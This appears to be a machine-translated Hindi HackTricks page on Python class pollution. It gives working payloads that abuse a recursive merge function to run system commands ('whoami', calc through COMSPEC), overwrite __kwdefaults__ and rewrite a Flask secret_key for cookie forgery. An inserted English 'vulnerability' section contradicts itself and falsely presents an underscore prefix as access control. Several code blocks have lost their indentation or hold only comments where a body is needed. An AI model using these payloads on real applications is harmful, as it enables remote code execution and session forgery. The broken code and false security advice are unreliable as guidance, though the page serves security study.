# कक्षा प्रदूषण (Python के प्रोटोटाइप प्रदूषण)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>

## मूल उदाहरण

जांचें कि वस्त्रों की कक्षाओं को तारों के साथ कैसे प्रदूषित किया जा सकता है:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## मूलभूत सुरक्षा कमजोरी का उदाहरण

Consider the following Python code:

```python
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def login(self):
        # Code for user login

    def logout(self):
        # Code for user logout

class Admin(User):
    def __init__(self, username, password):
        super().__init__(username, password)
        self.is_admin = True

    def delete_user(self, user):
        # Code to delete a user

# Creating a user object
user = User("john", "password123")

# Creating an admin object
admin = Admin("admin", "admin123")

# Deleting a user using the admin object
admin.delete_user(user)
```

In this example, we have two classes: `User` and `Admin`. The `Admin` class inherits from the `User` class. The `User` class has a method called `delete_user` which is used to delete a user. 

The vulnerability in this code lies in the fact that the `delete_user` method is accessible to both `User` and `Admin` objects. This means that a regular user can also delete other users by calling the `delete_user` method.

To fix this vulnerability, the `delete_user` method should only be accessible to `Admin` objects. One way to achieve this is by making the `delete_user` method a private method by prefixing it with an underscore (`_delete_user`). This way, only the `Admin` class can access and use this method.

```python
class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def login(self):
        # Code for user login

    def logout(self):
        # Code for user logout

class Admin(User):
    def __init__(self, username, password):
        super().__init__(username, password)
        self.is_admin = True

    def _delete_user(self, user):
        # Code to delete a user

# Creating a user object
user = User("john", "password123")

# Creating an admin object
admin = Admin("admin", "admin123")

# Deleting a user using the admin object
admin._delete_user(user)
```

By making the `delete_user` method private, we ensure that only the `Admin` class can access and use it, preventing regular users from deleting other users.
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## गैजेट उदाहरण

<details>

<summary>क्लास प्रॉपर्टी को डिफ़ॉल्ट मान द्वारा RCE (subprocess) बनाना</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary><code>globals</code> के माध्यम से अन्य कक्षाओं और ग्लोबल वेरिएबल को प्रदूषित करना</summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>अनियमित subprocess क्रियान्वयन</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>ओवरराइटिंग <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** सभी फ़ंक्शनों का एक विशेष गुणधर्म है, पायथन [दस्तावेज़ीकरण](https://docs.python.org/3/library/inspect.html) के आधार पर, यह "केवल-कीवर्ड" पैरामीटरों के लिए किसी भी डिफ़ॉल्ट मानों का एक "मैपिंग" है। इस गुणधर्म को प्रदूषित करने से हमें फ़ंक्शन के केवल-कीवर्ड पैरामीटरों के डिफ़ॉल्ट मानों को नियंत्रित करने की अनुमति मिलती है, ये पैरामीटर फ़ंक्शन के \* या \*args के बाद आते हैं।
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>फ़्लास्क सीक्रेट को फ़ाइलों के बीच अधिलेखित करना</summary>

तो, अगर आप एक कक्षा प्रदूषण कर सकते हैं जो वेब के मुख्य पायथन फ़ाइल में परिभाषित नहीं है, लेकिन **जिसकी कक्षा एक अलग फ़ाइल में परिभाषित है**। क्योंकि पिछले पेलोड में \_\_globals\_\_ तक पहुंचने के लिए आपको ऑब्जेक्ट की कक्षा या कक्षा के विधियों तक पहुंचने की आवश्यकता होती है, आप **उस फ़ाइल में ग्लोबल्स तक पहुंच सकेंगे, लेकिन मुख्य फ़ाइल में नहीं**। \
इसलिए, आप **फ़्लास्क ऐप ग्लोबल ऑब्जेक्ट तक पहुंच नहीं पाएंगे** जिसने मुख्य पृष्ठ में **सीक्रेट कुंजी** की परिभाषा की है:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
इस स्थिति में आपको एक गैजेट की आवश्यकता होती है जो फ़ाइलों को त्रावर्स करने के लिए उपयोग किया जाता है ताकि मुख्य फ़ाइल तक पहुंच सकें और **ग्लोबल ऑब्जेक्ट `app.secret_key` तक पहुंचें** और फ़्लास्क सीक्रेट की को बदल सकें और [**इस कुंजी को जानकर वृद्धि करें**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)।

इस तरह का एक पेलोड जैसा कि [इस लेख से](https://ctftime.org/writeup/36082):

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

इस payload का उपयोग करें **`app.secret_key`** (आपके ऐप में नाम अलग हो सकता है) को बदलने के लिए, ताकि आप नए और अधिक विशेषाधिकार flask cookies को साइन कर सकें।

</details>

और अधिक संदर्भ के लिए निम्नलिखित पृष्ठ की जांच करें:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## संदर्भ

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* प्राप्त करें [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) में शामिल हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** अनुसरण करें।**
* **अपने हैकिंग ट्रिक्स साझा करें,** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके।**

</details>
